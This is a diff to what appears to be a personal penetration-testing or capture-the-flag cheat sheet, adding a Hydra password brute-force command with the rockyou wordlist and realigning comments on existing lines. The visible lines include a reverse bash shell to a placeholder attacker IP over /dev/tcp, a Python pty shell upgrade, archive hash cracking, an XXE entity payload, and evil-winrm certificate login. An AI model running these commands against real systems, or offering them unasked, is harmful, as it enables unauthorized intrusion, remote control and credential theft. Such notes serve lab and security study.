@@ -49,7 +49,11 @@ curl <hostname> -I                                                              
 curl <hostname> -v                                                                 # Verbose mode with header
 curl http://site.com/images/favico.ico | md5sum                                    # Get hash of the favicon site and when chek it on the OWASP DB (see 1 note)
 
-#######################         XXE          #######################################
+########################     Bruteforce       ########################################
+
+hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt -vV ip protocl_ftp        # Bruteforce password for any protocol (FTP, SSH, RDP ...)
+
+#######################         XXE          #########################################
 
 <!DOCTYPE replace [<!ENTITY name "feast"> ]>
  <userInfo>
@@ -167,11 +171,11 @@ evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S                
 
 
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
-zip2john \ rar2john                                   # crack archives  via johntheripepr
+python3 -c 'import pty;pty.spawn("/bin/bash")'                                      # shell via python
+zip2john \ rar2john                                                                 # crack archives  via johntheripepr
 
 
-bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"      # revers bash via "nc -lvnp 9001"
+bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"                                   # revers bash via "nc -lvnp 9001"
 
 
 ######################## make bash interactive #####################################
